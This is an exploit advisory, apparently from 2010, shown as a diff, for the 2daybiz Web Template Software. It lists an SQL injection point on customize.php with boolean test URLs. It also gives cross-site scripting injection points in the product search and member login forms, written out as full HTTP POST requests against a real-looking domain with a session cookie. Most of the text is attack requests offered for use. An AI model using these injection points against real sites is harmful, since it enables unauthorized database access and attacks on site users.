@@ -1,0 +1,74 @@
+$-------------------------------------------------------------------------------------------------------------------
+$ 2daybiz - The Web Template Software SQL injection and XSS vulnerability
+$ Author : Sangteamtham
+$ Home : Hcegroup.net
+$ Download :http://www.2daybiz.com/webtemplatesoftware.html
+$ Date :06/24/2010
+$ Email :sangteamtham@gmail.com
+$
+$******************************************************************************************
+
+1.SQL injection
+http://server/customize.php?tid=[id]+[SQL]
+
+2.XSS
+
+2.a : search products module
+
+Here is my header:
+
+http://www.2daytemplates.com/category.php
+
+POST /category.php HTTP/1.1
+Host: www.2daytemplates.com
+User-Agent: Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.2.4)
+Gecko/20100611 Firefox/3.6.4
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-us,en;q=0.5
+Accept-Encoding: gzip,deflate
+Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
+Keep-Alive: 115
+Connection: keep-alive
+Referer: http://www.2daytemplates.com/category.php
+Cookie: PHPSESSID=j2bddq540saph1ve83gqii4276
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 168
+category=0&product=0&keyword=[XSS
+here]&itemno=ssss&templates_per_page=9&search=Search
+
+2.b: Login module
+
+http://www.2daytemplates.com/memberlogin.php
+
+POST /memberlogin.php HTTP/1.1
+Host: www.2daytemplates.com
+User-Agent: Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.2.4)
+Gecko/20100611 Firefox/3.6.4
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-us,en;q=0.5
+Accept-Encoding: gzip,deflate
+Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
+Keep-Alive: 115
+Connection: keep-alive
+Referer: http://www.2daytemplates.com/memberlogin.php
+Cookie: PHPSESSID=j2bddq540saph1ve83gqii4276
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 157
+email=sangteamtham_hce%40ymail.com&password=[XSS Here]opage=&Submit=Login
+
+XSS here such as:
+">">
+
+$******************************************************************************************
+$Demo:
+$ http://<server>/customize.php?tid=1314+and+1=1--
+$ http://<server>/customize.php?tid=1314+and+1=0--
+$
+$
+$
+$******************************************************************************************
+$ Greetz to: All Vietnamese hackers and Hackers out there researching for
+more security
+$
+$
+$--------------------------------------------------------------------------------------------------------------------
